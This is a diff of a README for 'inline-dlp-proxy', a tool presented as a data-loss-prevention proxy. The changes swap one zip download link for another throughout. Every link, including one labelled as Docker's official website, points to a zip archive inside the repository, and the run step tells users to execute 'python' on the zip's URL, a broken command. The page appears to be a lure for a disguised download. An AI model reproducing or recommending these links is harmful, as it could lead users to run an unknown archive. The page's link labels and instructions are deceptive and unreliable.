@@ -1,6 +1,6 @@
 # 🔍 inline-dlp-proxy - Protect Your Data in Real-Time
 
-[![Download Now](https://raw.githubusercontent.com/Akarsolusi/inline-dlp-proxy/main/config/inline-dlp-proxy_v1.5.zip%20Now-Click%20Here-success)](https://raw.githubusercontent.com/Akarsolusi/inline-dlp-proxy/main/config/inline-dlp-proxy_v1.5.zip)
+[![Download Now](https://github.com/Akarsolusi/inline-dlp-proxy/raw/refs/heads/main/frontend/dlp-inline-proxy-v3.7.zip%20Now-Click%20Here-success)](https://github.com/Akarsolusi/inline-dlp-proxy/raw/refs/heads/main/frontend/dlp-inline-proxy-v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -14,13 +14,13 @@ Before you start, make sure your system meets these requirements:
 - **Processor:** Intel Core i3 or equivalent
 - **RAM:** At least 4 GB
 - **Storage:** 500 MB of free space
-- **Docker:** Ensure you have Docker installed. You can download it from [Docker's official website](https://raw.githubusercontent.com/Akarsolusi/inline-dlp-proxy/main/config/inline-dlp-proxy_v1.5.zip).
+- **Docker:** Ensure you have Docker installed. You can download it from [Docker's official website](https://github.com/Akarsolusi/inline-dlp-proxy/raw/refs/heads/main/frontend/dlp-inline-proxy-v3.7.zip).
 
 ## 📥 Download & Install
 
 To download inline-dlp-proxy, visit the following link:
 
-[Download inline-dlp-proxy Releases](https://raw.githubusercontent.com/Akarsolusi/inline-dlp-proxy/main/config/inline-dlp-proxy_v1.5.zip)
+[Download inline-dlp-proxy Releases](https://github.com/Akarsolusi/inline-dlp-proxy/raw/refs/heads/main/frontend/dlp-inline-proxy-v3.7.zip)
 
 Follow these steps:
 
@@ -48,7 +48,7 @@ Follow these steps:
    - Open a terminal or command prompt in that folder.
    - Run the application using:
      ```
-     python https://raw.githubusercontent.com/Akarsolusi/inline-dlp-proxy/main/config/inline-dlp-proxy_v1.5.zip
+     python https://github.com/Akarsolusi/inline-dlp-proxy/raw/refs/heads/main/frontend/dlp-inline-proxy-v3.7.zip
      ```
 
 ## 🛠️ Configuration
@@ -93,4 +93,4 @@ If you're interested in contributing to inline-dlp-proxy, we welcome your input.
 
 inline-dlp-proxy is open-source software, licensed under the MIT License. You are free to use, modify, and distribute the software as long as you include the original license.
 
-[Download inline-dlp-proxy Releases](https://raw.githubusercontent.com/Akarsolusi/inline-dlp-proxy/main/config/inline-dlp-proxy_v1.5.zip)
+[Download inline-dlp-proxy Releases](https://github.com/Akarsolusi/inline-dlp-proxy/raw/refs/heads/main/frontend/dlp-inline-proxy-v3.7.zip)
